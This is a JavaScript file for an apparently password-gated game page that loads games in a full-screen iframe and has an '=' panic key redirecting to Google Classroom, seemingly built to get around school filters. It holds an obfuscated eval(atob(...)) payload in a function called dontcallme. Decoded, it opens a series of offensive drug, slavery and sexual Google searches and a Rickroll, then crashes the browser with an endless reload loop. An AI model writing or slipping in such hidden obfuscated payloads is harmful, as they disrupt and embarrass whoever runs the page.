
var pwd = "";

document.addEventListener('keydown', function(event) {
    if (event.key === '=') {
        cancelled = 1;
        window.location.href = 'https://classroom.google.com/';
    }
});

function dontcallme(){
    eval(atob("b3BlbigiaHR0cDovL2dvb2dsZS5jb20vc2VhcmNoP3E9QmlnK0JsYWNrK09pbHkrTWVuIik7CiAgICAgICAgb3BlbigiaHR0cDovL2dvb2dsZS5jb20vc2VhcmNoP3E9V2hlcmUrdG8rYnV5K3JlYWwrdGVzdGljYWxzIik7CiAgICAgICAgb3BlbigiaHR0cDovL2dvb2dsZS5jb20vc2VhcmNoP3E9Q29sdW1iaWFuK2NvY2FpbmUrcmVjaXBlIik7CiAgICAgICAgb3BlbigiaHR0cDovL2dvb2dsZS5jb20vc2VhcmNoP3E9SG93K3RvK2dldCtnaXJsZnJpZW5kIik7CiAgICAgICAgb3BlbigiaHR0cDovL2dvb2dsZS5jb20vc2VhcmNoP3E9V2hlcmUrdG8rYnV5K21ldGhhbXBoZXRhbWluZSIpOwogICAgICAgIG9wZW4oImh0dHA6Ly9nb29nbGUuY29tL3NlYXJjaD9xPUhvdyt0bytidXkrc2xhdmVzIik7CiAgICAgICAgb3BlbigiaHR0cDovL2dvb2dsZS5jb20vc2VhcmNoP3E9TG9va2luZytmb3IrZ2F5K3NleCIpOwogICAgICAgIG9wZW4oImh0dHA6Ly9nb29nbGUuY29tL3NlYXJjaD9xPUltK0dheSIpOwogICAgICAgIG9wZW4oImh0dHA6Ly9nb29nbGUuY29tL3NlYXJjaD9xPUdheStQb3JuIik7CiAgICAgICAgb3BlbigiaHR0cDovL2dvb2dsZS5jb20vc2VhcmNoP3E9SG90K01JTEZzK0luK015K0FyZWEiKTsKICAgICAgICBvcGVuKCJodHRwOi8vZ29vZ2xlLmNvbS9zZWFyY2g/cT1Mb29raW5nK0ZvcitTZXgiKTsKICAgICAgICBvcGVuKCJodHRwczovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PWRRdzR3OVdnWGNRJmFiX2NoYW5uZWw9Umlja0FzdGxleSIpOwogICAgICAgICAgICAvL2NyYXNoZXIKICAgICAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgICAgICB3aGlsZSgxKXt3aW5kb3cubG9jYXRpb24ucmVsb2FkKCk7fQogICAgICAgICAgICB9LCA3MDAwKTs="));
}

function run(){

    var iframe = document.createElement('iframe');
    
    var x = atob("aHR0cHM6Ly9haHIwY2htNmx5OTFkM3Z3YjJ4NWRoamh5MnN1ZG0udmVyY2VsLmFwcA==");

    if(pwd=="0.3"){x+="/0.3/";}
    if(pwd=="0.4"){x+="/pt4/";}
    if(pwd=="0.5"){x+="/0.5.0/";}
    if(pwd== "0.2" || pwd == "0.3" || pwd == "0.5"){
        iframe.src = x;
    }

    //calculate url for whatever reason
    let str = window.location.href;
    while(str[str.length-1]!='/'){
        str = str.substring(0, str.length - 1);
    }

    //these require a redirect
    if(pwd=="cc"){ 
        cancelled = 1;
        x=str+"/specialVideos/cookie/"
        window.location.href=x;
    }
    if(pwd=="icedodo"){
        cancelled = 1;
        x=str+"/specialVideos/icedoddo/"
        window.location.href=x;   
    }
    if(pwd=="mc"){
        cancelled = 1;
        x=str+"/mc/index.html"
        window.location.href=x;
    }
    if(pwd=="celest"){
        cancelled = 1;
        window.location.href = "/celeste-wasm/home.html"
    }
    //iframe sites
    if(pwd=="ts3"){
        iframe.src=str+"/ts3/index.html"
    }
    if(pwd=="selenite"){
         iframe.src="https://peletiaek.netlify.app/";
    }
    
    iframe.setAttribute('allowFullScreen', '');
    iframe.style="position: absolute; height: 100%; width: 100%; border: none"
    document.body.innerHTML="";
    document.body.appendChild(iframe);
}
